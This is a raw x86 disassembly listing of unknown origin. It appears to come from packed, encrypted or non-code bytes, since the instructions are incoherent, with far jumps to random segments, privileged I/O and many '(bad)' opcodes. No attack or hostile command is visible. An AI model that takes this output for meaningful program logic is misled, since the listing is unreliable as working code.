  418551:	call   DWORD PTR [edx]
  418553:	mov    ah,0x5f
  418555:	lds    ebp,FWORD PTR [edx+ebp*2]
  418558:	pop    ebx
  418559:	fcomp  DWORD PTR [edx-0x4e]
  41855c:	mov    ch,0xf3
  41855e:	dec    ebx
  41855f:	mov    al,ds:0x2ded1a77
  418564:	mov    ah,0x5a
  418566:	sbb    eax,DWORD PTR [eax-0x2a50e638]
  41856c:	cmp    dl,BYTE PTR [edi+0x12]
  41856f:	mov    eax,0x86d8e045
  418574:	sub    DWORD PTR [edi-0x12f3a46a],0xffffffad
  41857b:	fld    TBYTE PTR [ebp-0x470c1725]
  418581:	fdivr  DWORD PTR [ebp+0x10ce953e]
  418587:	retf   0x7081
  41858a:	fimul  WORD PTR [ebp-0x408cc7f2]
  418590:	or     bl,BYTE PTR [ebx+0x5f02debe]
  418596:	into   
  418597:	sbb    al,ah
  418599:	std    
  41859a:	push   ss
  41859b:	jle    0x4185a3
  41859d:	adc    al,BYTE PTR [ecx+0x12a36059]
  4185a3:	xchg   ebx,eax
  4185a4:	push   eax
  4185a5:	outs   dx,BYTE PTR ds:[esi]
  4185a6:	mov    esi,0xa0027143
  4185ab:	and    al,0xc7
  4185ad:	xor    bh,cl
  4185af:	xchg   DWORD PTR [ecx+eiz*1-0x62f9263d],ebp
  4185b6:	test   al,0x3f
  4185b8:	or     DWORD PTR [edi-0x4c],edx
  4185bb:	ret    0xf65f
  4185be:	adc    eax,esp
  4185c0:	shl    BYTE PTR [edx],cl
  4185c2:	push   0xffffffbb
  4185c4:	push   ebp
  4185c5:	inc    DWORD PTR [esi]
  4185c7:	mov    BYTE PTR ds:0x382d70b5,ah
  4185cd:	cmp    ebp,DWORD PTR [ebx-0x2134dee9]
  4185d3:	mov    cl,0x2d
  4185d5:	aam    0xff
  4185d7:	mov    ebx,fs
  4185d9:	ins    DWORD PTR es:[edi],dx
  4185da:	bound  edi,QWORD PTR [ecx]
  4185dc:	xchg   edi,eax
  4185dd:	sub    eax,0x47b5ce7e
  4185e2:	xchg   DWORD PTR [edi+eax*2+0x23],ecx
  4185e6:	jno    0x4185aa
  4185e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4185e9:	dec    esi
  4185ea:	sbb    DWORD PTR [esi+eiz*8+0x2e853e11],esp
  4185f1:	adc    BYTE PTR [ecx],dh
  4185f3:	jl     0x418640
  4185f5:	inc    edi
  4185f6:	cmp    al,0xaa
  4185f8:	sub    edx,ebp
  4185fa:	pop    edx
  4185fb:	xchg   edx,eax
  4185fc:	push   ds
  4185fd:	stos   BYTE PTR es:[edi],al
  4185fe:	jecxz  0x41861e
  418600:	leave  
  418601:	lods   al,BYTE PTR ds:[esi]
  418602:	dec    ebx
  418603:	ins    BYTE PTR es:[edi],dx
  418604:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418605:	fbstp  TBYTE PTR [ebp+0x4fe077ed]
  41860b:	cwde   
  41860c:	out    0xc7,al
  41860e:	dec    ecx
  41860f:	ds js  0x4185c8
  418612:	scas   eax,DWORD PTR es:[edi]
  418613:	hlt    
  418614:	xchg   edi,eax
  418615:	cwde   
  418616:	xchg   ebx,eax
  418617:	loop   0x418658
  418619:	lds    ecx,FWORD PTR [ebp+0xda72f68]
  41861f:	add    eax,0x824d0200
  418624:	add    esp,ebp
  418626:	mov    ch,0xa1
  418628:	push   esi
  418629:	cld    
  41862a:	add    DWORD PTR [edx],0xffffffcb
  41862d:	jne    0x418617
  41862f:	dec    ebp
  418630:	push   ebx
  418631:	dec    esi
  418632:	stos   DWORD PTR es:[edi],eax
  418633:	out    dx,eax
  418634:	fstp   TBYTE PTR [eax+0x1ddc7c80]
  41863a:	cmc    
  41863b:	jge    0x418662
  41863d:	data16 out dx,al
  41863f:	xor    cl,BYTE PTR [ebp+0x19]
  418642:	fsubrp st(2),st
  418644:	jne    0x4185d2
  418646:	ss dec ebx
  418648:	or     DWORD PTR [edi],esi
  41864a:	jl     0x418604
  41864c:	or     edx,DWORD PTR [edx]
  41864e:	adc    eax,0xf9c34e1d
  418653:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418654:	lods   eax,DWORD PTR ds:[esi]
  418655:	cmc    
  418656:	sub    BYTE PTR [edi-0x2a],0x57
  41865a:	sub    ah,ah
  41865c:	dec    ebp
  41865d:	push   ds
  41865e:	pop    esi
  41865f:	sbb    edx,DWORD PTR [ebx+0x7add6ef0]
  418665:	(bad)  
  418666:	dec    ebx
  418667:	ret    
  418668:	add    DWORD PTR [ecx-0x18e37199],eax
  41866e:	sub    dh,BYTE PTR [esi-0x19]
  418671:	cmp    al,al
  418673:	idiv   BYTE PTR [ebx-0x76b88294]
  418679:	jp     0x418615
  41867b:	inc    eax
  41867c:	mov    eax,ds:0xe8ab3d57
  418681:	push   0x406560f4
  418686:	(bad)  
  418687:	xor    eax,0xe64b53ee
  41868c:	add    eax,0x4fc7154d
  418691:	enter  0x507e,0x16
  418695:	mov    edi,0x4bca0217
  41869a:	xchg   ebx,eax
  41869b:	mov    esi,0x3b061ddc
  4186a0:	push   ss
  4186a1:	fld    TBYTE PTR [esi]
  4186a3:	lea    ebp,[esp+ebx*8]
  4186a6:	xchg   esp,eax
  4186a7:	xchg   DWORD PTR [ecx+edx*1+0x1e],esi
  4186ab:	ins    DWORD PTR es:[edi],dx
  4186ac:	fimul  DWORD PTR [ecx]
  4186ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4186af:	(bad)
  4186b2:	mov    dh,0xb1
  4186b4:	jne    0x418691
  4186b6:	in     al,0x7e
  4186b8:	mov    eax,ds:0xa7c53066
  4186bd:	ret    
  4186be:	sub    cl,bl
  4186c0:	push   edi
  4186c1:	lock pop esi
  4186c3:	in     al,0x21
  4186c5:	sbb    esp,DWORD PTR ds:0xc214fcc2
  4186cb:	in     eax,dx
  4186cc:	lods   al,BYTE PTR ds:[esi]
  4186cd:	or     bl,BYTE PTR [eax]
  4186cf:	xor    DWORD PTR [ebp+0x4d],edi
  4186d2:	jae    0x4186b4
  4186d4:	xchg   edx,eax
  4186d5:	jo     0x41867f
  4186d7:	out    dx,al
  4186d8:	(bad)  
  4186d9:	adc    eax,0x8583338d
  4186de:	sub    eax,DWORD PTR [ebx+0x3bee06b0]
  4186e4:	lods   eax,DWORD PTR ds:[esi]
  4186e5:	enter  0x6b46,0xb4
  4186e9:	pushf  
  4186ea:	jg     0x418715
  4186ec:	and    ch,bh
  4186ee:	imul   eax,DWORD PTR [edi+0x19fbfa55],0x56
  4186f5:	jmp    0x63c13700
  4186fa:	jbe    0x41871c
  4186fc:	push   ebp
  4186fd:	pop    ss
  4186fe:	cmc    
  4186ff:	mov    edx,0x5ab57c71
  418704:	sar    dh,0xa9
  418707:	mov    BYTE PTR [edx+0x1fca489e],ah
  41870d:	adc    DWORD PTR [ebp-0x19beab74],edi
  418713:	popf   
  418714:	or     BYTE PTR [esi+0x15f6bf83],0xd9
  41871b:	pop    es
  41871c:	cmp    al,0x84
  41871e:	push   eax
  41871f:	clc    
  418720:	mov    eax,ds:0x1374dd2d
  418725:	cli    
  418726:	(bad)  
  418727:	xlat   BYTE PTR ds:[ebx]
  418728:	push   ds
  418729:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41872a:	xor    eax,0xca845583
  41872f:	sbb    al,0x87
  418731:	in     al,0x58
  418733:	leave  
  418734:	xor    dh,dl
  418736:	adc    al,0x6c
  418738:	push   ss
  418739:	cmp    al,0xea
  41873b:	jg     0x4186e2
  41873d:	repz clc 
  41873f:	popf   
  418740:	xchg   edx,eax
  418741:	nop
  418742:	out    dx,al
  418743:	imul   edx,DWORD PTR [ebx],0x695c74a7
  418749:	add    cl,BYTE PTR [edi]
  41874b:	mov    al,ds:0x767350d6
  418750:	mov    BYTE PTR [ecx],ah
  418752:	shr    BYTE PTR [edi+0x5],0x45
  418756:	push   edi
  418757:	cwde   
  418758:	sahf   
  418759:	jp     0x418774
  41875b:	sub    cl,dl
  41875d:	leave  
  41875e:	(bad)  
  41875f:	call   0x2b567d55
  418764:	es sar ebp,1
  418767:	mov    eax,0x2f53edba
  41876c:	cs push ecx
  41876e:	cli    
  41876f:	push   edx
  418770:	or     DWORD PTR [esi+0x60],eax
  418773:	sub    cl,al
  418775:	dec    ecx
  418776:	inc    ebx
  418777:	call   0x847e4a0e
  41877c:	jle    0x4187a1
  41877e:	dec    ebx
  41877f:	mov    ds:0xf08a0a29,al
  418784:	xor    bl,BYTE PTR [edi]
  418786:	jbe    0x4187fa
  418788:	adc    ebx,eax
  41878a:	inc    esp
  41878b:	div    DWORD PTR [edx+0x53fa0a19]
  418791:	xlat   BYTE PTR ds:[ebx]
  418792:	sti    
  418793:	pop    esi
  418794:	ds in  eax,dx
  418796:	imul   ebp,DWORD PTR [ebx],0xd53b0e00
  41879c:	or     al,0x1
  41879e:	push   ebp
  41879f:	(bad)  
  4187a0:	call   0x31c0d22c
  4187a5:	xchg   edi,eax
  4187a6:	leave  
  4187a7:	push   edx
  4187a8:	push   cs
  4187a9:	push   0x3e
  4187ab:	jo     0x4187ad
  4187ad:	fsubr  st,st(3)
  4187af:	sbb    ebp,esp
  4187b1:	xor    eax,0x4b2d70c7
  4187b6:	mov    eax,ds:0xc1142de3
  4187bb:	dec    esi
  4187bc:	fistp  WORD PTR [ecx]
  4187be:	enter  0x9923,0x45
  4187c2:	pop    esi
  4187c3:	jecxz  0x418799
  4187c5:	rcl    cl,1
  4187c7:	ss push esi
  4187c9:	sar    ch,0x8c
  4187cc:	retf   0xb004
  4187cf:	or     eax,0x1e861605
  4187d4:	dec    edx
  4187d5:	icebp  
  4187d6:	inc    ecx
  4187d7:	das    
  4187d8:	mov    dh,0x6a
  4187da:	jl     0x418835
  4187dc:	and    dl,al
  4187de:	popa   
  4187df:	jno    0x4187cb
  4187e1:	and    al,0x96
  4187e3:	xchg   ebx,eax
  4187e4:	scas   al,BYTE PTR es:[edi]
  4187e5:	xchg   edi,eax
  4187e6:	add    bl,0xa6
  4187e9:	je     0x418844
  4187eb:	mov    dl,0xb1
  4187ed:	cmp    al,dl
  4187ef:	pop    ss
  4187f0:	(bad)  
  4187f1:	mov    ebp,0xd20df575
  4187f6:	fisttp QWORD PTR [esi-0x27]
  4187f9:	popf   
  4187fa:	push   ebx
  4187fb:	jo     0x41886c
  4187fd:	inc    ecx
  4187fe:	sub    al,0x79
  418800:	mov    ds:0x96019896,eax
  418805:	jb     0x41881f
  418807:	fimul  DWORD PTR [edx]
  418809:	mov    al,0xfb
  41880b:	ds cmp al,0xd0
  41880e:	xchg   DWORD PTR [edi+edx*2],ecx
  418811:	jmp    0x726f7e8d
  418816:	icebp  
  418817:	movups xmm7,XMMWORD PTR [eax+ebx*8-0x4143e04d]
  41881f:	in     al,dx
  418820:	mov    eax,0xfcd16db5
  418825:	(bad)  
  418827:	arpl   WORD PTR [edx],bx
  418829:	mov    ch,0xd3
  41882b:	sub    bh,bh
  41882d:	mov    WORD PTR [edx+0xb],gs
  418830:	outs   dx,DWORD PTR ds:[esi]
  418831:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418832:	out    dx,eax
  418833:	dec    di
  418835:	test   DWORD PTR [eax-0xc33863f],0x3695c81d
  41883f:	in     eax,0xee
  418841:	pop    edi
  418842:	cs stc 
  418844:	sbb    DWORD PTR [ecx+0x1074ba0a],ebx
  41884a:	and    al,0x91
  41884c:	or     dh,BYTE PTR [esi+0x48]
  41884f:	shl    BYTE PTR [edx-0x5030ee95],1
  418855:	push   edi
  418856:	loopne 0x4188cf
  418858:	xor    bh,BYTE PTR [edx+ebx*8]
  41885b:	or     dl,BYTE PTR [ecx+0x3b]
  41885e:	clc    
  41885f:	xchg   edx,eax
  418860:	xor    eax,0xf374510
  418865:	adc    ch,BYTE PTR [edi+0x67dd95cb]
  41886b:	hlt    
  41886c:	in     eax,0xc5
  41886e:	dec    esi
  41886f:	test   DWORD PTR [ecx-0xb],edi
  418872:	adc    dh,BYTE PTR [edi]
  418874:	mov    al,0x10
  418876:	aam    0x32
  418878:	jmp    0x418814
  41887a:	cmp    esi,DWORD PTR [esi-0x4cd10b66]
  418880:	add    al,0xd4
  418882:	outs   dx,DWORD PTR ds:[esi]
  418883:	inc    ebp
  418884:	inc    ebx
  418885:	aaa    
  418886:	call   0xede3:0xebdd5636
  41888d:	pop    eax
  41888e:	in     eax,dx
  41888f:	push   edx
  418890:	adc    dl,ah
  418892:	in     eax,dx
  418893:	data16 mov dl,0x18
  418896:	jge    0x41881b
  418898:	adc    al,0x88
  41889a:	or     ebp,edi
  41889c:	fs inc ebx
  41889e:	adc    edi,esi
  4188a0:	std    
  4188a1:	inc    edx
  4188a2:	pop    ds
  4188a3:	retf   
  4188a4:	in     eax,dx
  4188a5:	or     eax,0x370b3d33
  4188aa:	mov    edx,0x9b54176
  4188af:	cmp    ebp,DWORD PTR [ecx-0x5d]
  4188b2:	jmp    0xff8f0000
  4188b7:	dec    ecx
  4188b8:	pop    ss
  4188b9:	test   BYTE PTR [ecx],bl
  4188bb:	jecxz  0x418861
  4188bd:	xor    eax,0x1ee7fc6c
  4188c2:	or     bl,BYTE PTR [edx]
  4188c4:	jl     0x418880
  4188c6:	fdivrp st(7),st
  4188c8:	or     dl,ch
  4188ca:	push   cs
  4188cb:	in     al,dx
  4188cc:	mov    al,ds:0x7e142a9d
  4188d1:	and    al,BYTE PTR [edi]
  4188d3:	fimul  DWORD PTR [ecx]
  4188d5:	cdq    
  4188d6:	pcmpeqw mm0,QWORD PTR [esi-0xf]
  4188da:	cld    
  4188db:	pop    edi
  4188dc:	push   edi
  4188dd:	mov    bh,0xd
  4188df:	mov    ecx,0x38440b57
  4188e4:	push   edi
  4188e5:	js     0x418880
  4188e7:	out    0x59,eax
  4188e9:	cmp    eax,0xecc120de
  4188ee:	adc    ch,BYTE PTR [ecx-0x288bd58]
  4188f4:	cmp    esp,DWORD PTR [edx+0xf8fe17]
  4188fa:	popf   
  4188fb:	mov    ecx,DWORD PTR [ecx]
  4188fd:	and    al,0xfd
  4188ff:	sbb    DWORD PTR es:[edx],ebx
  418902:	dec    edi
  418903:	jae    0x4188ff
  418905:	loopne 0x418946
  418907:	pop    edx
  418908:	push   ecx
  418909:	and    ah,dh
  41890b:	adc    dl,bh
  41890d:	xchg   ebp,eax
  41890e:	ja     0x41895a
  418910:	cmp    DWORD PTR [ecx],eax
  418912:	and    edi,DWORD PTR ds:0xe717eca3
  418918:	pusha  
  418919:	fisub  WORD PTR [esi]
  41891b:	daa    
  41891c:	loopne 0x418919
  41891e:	mov    WORD PTR [esi-0x9],cs
  418921:	jo     0x418952
  418923:	ins    DWORD PTR es:[edi],dx
  418924:	pop    DWORD PTR [esi]
  418926:	xor    BYTE PTR [ecx+0x3a],ch
  418929:	inc    esp
  41892a:	imul   edi,DWORD PTR [esi+0x3a],0xc48fad13
  418931:	inc    eax
  418932:	(bad)  
  418934:	loopne 0x4189aa
  418936:	sbb    bl,BYTE PTR [ebx+0x5]
  418939:	int    0x95
  41893b:	popa   
  41893c:	pop    ss
  41893d:	pop    edi
  41893e:	std    
  41893f:	lahf   
  418940:	outs   dx,DWORD PTR ds:[esi]
  418941:	out    dx,al
  418942:	mov    al,0x9
  418944:	cmp    BYTE PTR [ecx],al
  418946:	ja     0x418963
  418948:	outs   dx,BYTE PTR ds:[esi]
  418949:	loope  0x41897c
  41894b:	popa   
  41894c:	fisttp QWORD PTR [ebp-0x37f69968]
  418952:	rdmsr  
  418954:	xlat   BYTE PTR ds:[ebx]
  418955:	sbb    al,0x76
  418957:	cld    
  418958:	dec    eax
  418959:	int    0x38
  41895b:	sub    DWORD PTR [edx-0x56],eax
  41895e:	dec    edx
  41895f:	mov    edi,0x9aadd3ec
  418964:	add    al,0x3
  418966:	jns    0x41897c
  418968:	or     BYTE PTR [edx],al
  41896a:	push   ds
  41896b:	icebp  
  41896c:	lock outs dx,DWORD PTR ds:[esi]
  41896e:	out    dx,al
  41896f:	retf   
  418970:	mov    al,cl
  418972:	jp     0x4189b7
  418974:	mov    ch,0x2c
  418976:	cmp    BYTE PTR [ecx],dl
  418978:	mov    WORD PTR [ecx],cs
  41897a:	xchg   ebp,eax
  41897b:	ret    
  41897c:	sbb    DWORD PTR [eax],esi
  41897e:	mov    edx,0xed37b625
  418983:	(bad)  
  418984:	int    0x5b
  418986:	daa    
  418987:	mov    dh,0x52
  418989:	xchg   ecx,eax
  41898a:	cmp    ah,dh
  41898c:	jns    0x418954
  41898e:	std    
  41898f:	adc    BYTE PTR [esi+eax*2+0x1a],bh
  418993:	enter  0xfcb0,0xd
  418997:	popa   
  418998:	sbb    ch,cl
  41899a:	xchg   BYTE PTR [ecx],al
  41899c:	xchg   edi,eax
  41899d:	std    
  41899e:	cmp    cl,BYTE PTR [edi]
  4189a0:	dec    eax
  4189a1:	loope  0x418949
  4189a3:	daa    
  4189a4:	retf   0x7eeb
  4189a7:	mov    ecx,0xd43fddd4
  4189ac:	mov    ah,BYTE PTR [esi+0x24d98f96]
  4189b2:	(bad)  
  4189b3:	sbb    al,0xad
  4189b5:	xchg   eax,ebx
  4189b7:	call   0xda53efdc
  4189bc:	xchg   ecx,eax
  4189bd:	add    eax,0xf8161411
  4189c2:	jne    0x418a23
  4189c4:	xor    al,0x13
  4189c6:	test   ebx,0x92e71f6d
  4189cc:	jmp    0x41899a
  4189ce:	jmp    0xc2f6:0xb04f93
  4189d5:	clc    
  4189d6:	sar    DWORD PTR [eax-0x197bb0c5],1
  4189dc:	jecxz  0x41895f
  4189de:	lods   al,BYTE PTR ds:[esi]
  4189df:	cmp    DWORD PTR [edx],edx
  4189e1:	inc    eax
  4189e2:	call   0xb6bf:0xdcf942c5
  4189e9:	(bad)  
  4189ea:	jle    0x418974
  4189ec:	into   
  4189ed:	fdiv   QWORD PTR [ecx+0x54]
  4189f0:	std    
  4189f1:	push   eax
  4189f2:	scas   al,BYTE PTR es:[edi]
  4189f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4189f4:	jmp    0x37b1536f
  4189f9:	in     eax,0x52
  4189fb:	jl     0x418a03
  4189fd:	stos   BYTE PTR es:[edi],al
  4189fe:	and    dh,0x34
  418a01:	mov    al,ds:0xa421db
  418a06:	sahf   
  418a07:	idiv   DWORD PTR [ebx+0x3313b6d2]
  418a0d:	mov    edi,0x7180a5d3
  418a12:	push   0x87495b5a
  418a17:	mov    ch,0x35
  418a19:	ins    BYTE PTR es:[edi],dx
  418a1a:	call   0x8de3:0xf60050ac
  418a21:	lds    edx,FWORD PTR [ebx+0x7ad2d4a4]
  418a27:	xor    eax,DWORD PTR [eax+0xe7ecd5a]
  418a2d:	aaa    
  418a2e:	sar    DWORD PTR [ecx+0x77],1
  418a31:	outs   dx,BYTE PTR ds:[esi]
  418a32:	adc    eax,0xcf015311
  418a37:	enter  0xb5e6,0x9
  418a3b:	xchg   ebp,eax
  418a3c:	addr16 (bad) 
  418a3f:	out    0x6e,al
  418a41:	and    DWORD PTR [ecx+ecx*8],edi
  418a44:	xchg   edx,eax
  418a45:	mov    ebx,0x99c143d9
  418a4a:	repz jb 0x4189fd
  418a4d:	ins    BYTE PTR es:[edi],dx
  418a4e:	int3   
  418a4f:	ins    DWORD PTR es:[edi],dx
  418a50:	popf   
  418a51:	stc    
  418a52:	addr16 dec ecx
  418a54:	or     eax,DWORD PTR [edi+ebx*8+0x71a55bce]
  418a5b:	inc    edx
  418a5c:	xor    ah,BYTE PTR [bx+0x4fd8]
  418a61:	es dec edx
  418a63:	pop    ds
  418a64:	xor    al,0xde
  418a66:	inc    ebp
  418a67:	pop    edx
  418a68:	aad    0xd
  418a6a:	adc    ecx,esi
  418a6c:	dec    esp
  418a6d:	aam    0x15
  418a6f:	mov    bl,0x10
  418a71:	repnz xchg ebp,eax
  418a73:	out    dx,al
  418a74:	popf   
  418a75:	arpl   WORD PTR [edi+0x1e6ee1d6],bp
  418a7b:	(bad)  
  418a7c:	bound  esi,QWORD PTR [ecx+0x79]
  418a7f:	dec    edi
  418a80:	jmp    0x39d9e8cd
  418a85:	dec    esp
  418a86:	xlat   BYTE PTR ds:[ebx]
  418a87:	sbb    al,BYTE PTR [ecx-0x7c58628f]
  418a8d:	jmp    0x17e1:0xe575e12c
  418a94:	mov    dh,0xa0
  418a96:	ins    BYTE PTR es:[edi],dx
  418a97:	xchg   BYTE PTR [edx+eiz*8-0x6e],ah
  418a9b:	pop    DWORD PTR [ecx]
  418a9d:	(bad)  
  418a9e:	sbb    al,0x40
  418aa0:	loope  0x418a63
  418aa2:	popa   
  418aa3:	and    dh,cl
  418aa5:	or     eax,eax
  418aa7:	pop    ss
  418aa8:	pop    ebx
  418aa9:	pop    ecx
  418aaa:	jmp    0xce46:0xaa0460d6
  418ab1:	sub    al,0x1b
  418ab3:	outs   dx,DWORD PTR ds:[esi]
  418ab4:	sub    DWORD PTR [edx],ebp
  418ab6:	cmc    
  418ab7:	scas   eax,DWORD PTR es:[edi]
  418ab8:	test   al,0x55
  418aba:	pop    edx
  418abb:	cmp    DWORD PTR [ecx+esi*4-0x6f692f9b],ebp
  418ac2:	dec    esp
  418ac3:	xchg   edi,eax
  418ac4:	call   0x5112:0x69eb8c40
  418acb:	cmp    al,BYTE PTR [esi+0x2ca255ef]
  418ad1:	or     al,0x53
  418ad3:	sub    al,BYTE PTR [esi+0x713e21e0]
  418ad9:	(bad)  
  418ada:	or     BYTE PTR cs:[edi+0x597704a6],bh
  418ae1:	ret    
  418ae2:	mov    edx,0xc213a3
  418ae7:	sahf   
  418ae8:	rcr    eax,1
  418aea:	cmp    edi,DWORD PTR [ebx+edi*2+0x1c]
  418aee:	sar    BYTE PTR [eax+0x57fbcbcb],cl
  418af4:	fiadd  DWORD PTR [edi-0x47]
  418af7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418af8:	addps  xmm5,XMMWORD PTR [edi]
  418afb:	xor    ah,cl
  418afd:	mov    dl,0x2a
  418aff:	scas   al,BYTE PTR es:[edi]
  418b00:	add    DWORD PTR [ebx+0x600949c3],eax
  418b06:	and    ah,BYTE PTR [ebx+0x9d3b660]
  418b0c:	fld    DWORD PTR [edx-0x4b]
  418b0f:	jp     0x418b50
  418b11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418b12:	jb     0x418adb
  418b14:	and    al,al
  418b16:	mov    al,ds:0x56d55e01
  418b1b:	gs dec eax
  418b1d:	imul   ebx,esp,0xffffff90
  418b20:	pushf  
  418b21:	popf   
  418b22:	and    bl,BYTE PTR [edi+esi*2+0x553bdd4e]
  418b29:	mov    BYTE PTR [ecx+0x6e076ab6],bl
  418b2f:	lock inc edi
  418b31:	mov    esp,?
  418b33:	jbe    0x418ab8
  418b35:	xor    eax,0xe2478ba4
  418b3a:	popa   
  418b3b:	jae    0x418ba3
  418b3d:	ins    BYTE PTR es:[edi],dx
  418b3e:	ss clc 
  418b40:	mov    cl,0xdb
  418b42:	test   ecx,eax
  418b44:	mov    eax,0x9325bdad
  418b49:	aaa    
  418b4a:	call   0xb493:0x66736414
  418b51:	xor    ecx,DWORD PTR [ebx+esi*1+0x5eb532a6]
  418b58:	(bad)  
  418b5a:	retf   
  418b5b:	mov    ebx,0x2b987f1f
  418b60:	or     ecx,DWORD PTR [edi+0x46]
  418b63:	jb     0x418ba1
  418b65:	test   ch,bl
  418b67:	jns    0x418aee
  418b69:	adc    ecx,DWORD PTR ds:0x1fe2ddef
  418b6f:	clc    
  418b70:	cmp    al,0x6f
  418b72:	cmp    eax,0xe8cf8f54
  418b77:	outs   dx,BYTE PTR ds:[esi]
  418b78:	in     eax,dx
  418b79:	adc    DWORD PTR [edx],edx
  418b7b:	out    0x6a,al
  418b7d:	scas   eax,DWORD PTR es:[edi]
  418b7e:	loope  0x418b95
  418b80:	stos   DWORD PTR es:[edi],eax
  418b81:	xchg   edi,eax
  418b82:	shl    BYTE PTR [edi],cl
  418b84:	js     0x418b99
  418b86:	pop    ebx
  418b87:	and    bl,BYTE PTR [eax]
  418b89:	push   cs
  418b8a:	mov    ds:0xa067b366,al
  418b8f:	sbb    bh,BYTE PTR [esi-0x6d]
  418b92:	sbb    bh,ah
  418b94:	sbb    ebx,DWORD PTR [ecx-0x69]
  418b97:	dec    ecx
  418b98:	and    bl,BYTE PTR [edx+0x4b]
  418b9b:	pop    ds
  418b9c:	sbb    ecx,DWORD PTR [esi]
  418b9e:	dec    ecx
  418b9f:	mov    edx,0x2275015c
  418ba4:	xchg   bl,ah
  418ba6:	xchg   DWORD PTR [ecx],edx
  418ba8:	lock add ebp,0xfffffffe
  418bac:	fbstp  TBYTE PTR [edx+0x7d7fe914]
  418bb2:	cld    
  418bb3:	jmp    0x2ada:0xc3121f53
  418bba:	or     DWORD PTR [ecx+0x7e08ba0c],ecx
  418bc0:	test   edi,ecx
  418bc2:	or     ebp,edi
  418bc4:	push   ecx
  418bc5:	ins    BYTE PTR es:[edi],dx
  418bc6:	loopne 0x418ba5
  418bc8:	mov    dl,0x77
  418bca:	jge    0x418c35
  418bcc:	xchg   edi,eax
  418bcd:	(bad)  
  418bcf:	in     eax,dx
  418bd0:	pop    ss
  418bd1:	cmp    BYTE PTR [ebx],ah
  418bd3:	fdivr  QWORD PTR [esi+0x24b8b71c]
  418bd9:	push   edx
  418bda:	iret   
  418bdb:	jne    0x418beb
  418bdd:	sub    bh,BYTE PTR [edi-0x5e]
  418be0:	add    al,0x43
  418be2:	push   ebx
  418be3:	mov    BYTE PTR [edx-0x5b],dh
  418be6:	mov    eax,0x3bc7e440
  418beb:	pop    edi
  418bec:	mov    ds:0xcb46b099,eax
  418bf1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418bf2:	imul   BYTE PTR [ebp-0x7c]
  418bf5:	neg    eax
  418bf7:	(bad)  
  418bf8:	cwde   
  418bf9:	add    eax,0x810767
  418bfe:	cli    
  418bff:	cmp    DWORD PTR ds:0xbc5a3af9,esp
  418c05:	aaa    
  418c06:	fiadd  WORD PTR [ebx]
  418c08:	lods   eax,DWORD PTR ds:[esi]
  418c09:	stc    
  418c0a:	sbb    ecx,0x78
  418c0d:	mov    gs:0xc0150eef,eax
  418c13:	iret   
  418c14:	and    BYTE PTR [ecx-0x29],dh
  418c17:	mov    DWORD PTR [esi+0xb5d0fde],eax
  418c1d:	fild   QWORD PTR [esi]
  418c1f:	mov    ch,0x94
  418c21:	adc    bh,ch
  418c23:	pop    ebx
  418c24:	arpl   WORD PTR [ebx],bx
  418c26:	pushf  
  418c27:	dec    ecx
  418c28:	mov    eax,es
  418c2a:	or     BYTE PTR [edx+0x3e60414d],0x59
  418c31:	enter  0x2a69,0xbd
  418c35:	fmul   DWORD PTR [edi+0xfa9f28f]
  418c3b:	push   edx
  418c3c:	xchg   ebp,eax
  418c3d:	pop    es
  418c3e:	jno    0x418bd6
  418c40:	es out dx,al
  418c42:	test   al,0xf
  418c44:	test   BYTE PTR [edi],dh
  418c46:	pop    ecx
  418c47:	aam    0x5e
  418c49:	outs   dx,BYTE PTR ds:[esi]
  418c4a:	scas   al,BYTE PTR es:[edi]
  418c4b:	dec    esp
  418c4c:	fiadd  WORD PTR [ebp+0x45]
  418c4f:	mov    cl,0xd0
  418c51:	loope  0x418cb4
  418c53:	retf   
  418c54:	jbe    0x418c50
  418c56:	add    DWORD PTR [edx+0x2bf81e33],ebx
  418c5c:	push   esp
  418c5d:	dec    ecx
  418c5e:	adc    eax,0xffffffc3
  418c61:	sub    DWORD PTR [ecx],esi
  418c63:	mov    bh,0x4
  418c65:	fisttp WORD PTR [edx+0x32]
  418c68:	jno    0x418cad
  418c6a:	adc    DWORD PTR [eax],ebx
  418c6c:	mov    ah,0xb9
  418c6e:	fadd   QWORD PTR [esp+ecx*8]
  418c71:	xor    edi,esp
  418c73:	test   DWORD PTR [ecx+0x1c78135b],eax
  418c79:	cli    
  418c7a:	add    dl,BYTE PTR [eax]
  418c7c:	shr    DWORD PTR [edx-0x1548e95d],0x5d
  418c83:	mov    eax,ds:0x20ea78f2
  418c88:	stc    
  418c89:	inc    ebx
  418c8a:	fwait
  418c8b:	fs retf 0xd578
  418c8f:	sub    BYTE PTR [esi-0x1a],0xf8
  418c93:	ficomp DWORD PTR [esi+0x4d]
  418c96:	mov    BYTE PTR [ecx],bl
  418c98:	mov    ch,0x11
  418c9a:	aas    
  418c9b:	xlat   BYTE PTR ds:[ebx]
  418c9c:	(bad)  
  418c9d:	mov    ecx,0xcf29ab87
  418ca2:	cmovs  esp,DWORD PTR [edi+0x3ddba336]
  418ca9:	mov    ds:0x96c3f553,al
  418cae:	repnz or esp,edi
  418cb1:	ds jp  0x418d27
  418cb4:	dec    ebp
  418cb5:	dec    eax
  418cb6:	imul   ebp,DWORD PTR [eax],0x26933fda
  418cbc:	pop    ebx
  418cbd:	imul   esp,DWORD PTR [ecx-0x44576c85],0x4ffd428c
  418cc7:	pop    ecx
  418cc8:	mov    ah,0x16
  418cca:	lock and ebx,DWORD PTR [edi]
  418ccd:	(bad)  [ebp+0x67]
  418cd0:	dec    edx
  418cd1:	inc    eax
  418cd2:	fst    st(1)
  418cd4:	test   eax,0xad2ccf51
  418cd9:	pop    ebp
  418cda:	ror    BYTE PTR [edx],0x98
  418cdd:	cmp    al,0xa5
  418cdf:	xchg   esp,eax
  418ce0:	fmul   QWORD PTR [edx-0x2c]
  418ce3:	adc    eax,0xced3f98f
  418ce8:	mov    ss,WORD PTR [eax+0x2ffb781c]
  418cee:	out    0x39,al
  418cf0:	mov    ch,0x28
  418cf2:	and    BYTE PTR ds:0xef087fe9,al
  418cf8:	(bad)  
  418cf9:	pop    edx
